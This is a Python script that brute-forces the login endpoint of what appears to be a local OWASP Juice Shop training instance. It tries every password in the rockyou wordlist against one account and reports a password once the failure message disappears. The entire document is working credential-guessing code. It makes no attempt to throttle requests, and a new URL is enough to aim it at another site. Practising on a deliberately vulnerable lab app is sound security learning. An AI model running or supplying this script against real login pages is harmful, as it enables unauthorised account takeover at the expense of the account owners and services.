import requests

# Target URL of the login page
url = "http://localhost:3000/rest/user/login"

#username and password list files
email = "user@juice-sh.op"
password_file = "/usr/share/wordlists/rockyou.txt"

def login_brute_force():
    #open the password list
    with open(password_file, "r") as file:
        for password in file:
            password = password.strip() #removes any leading any trailing whitespaces.

            #create the payload with the username and current password attempt
            data = {"email": email, "password": password}

            #send POST request to the target URL
            response = requests.post(url, json=data) #JSON Format: The requests.post method uses json=data instead of data=data. This sends the payload as JSON, which is what Juice Shop expects.


            # Print the status code and response text for debugging
            print(f"Attempting password: {password} | Status Code: {response.status_code} | Response: {response.text}")

            #check if the login was successfull
            if "Invalid email or password." not in response.text:
                print(f"[+] Password found: {password}")
                return

            print(f"[-] Attempt failed: {password}")

    print("[-] Password not foundin the list")

#run the brute force function
login_brute_force()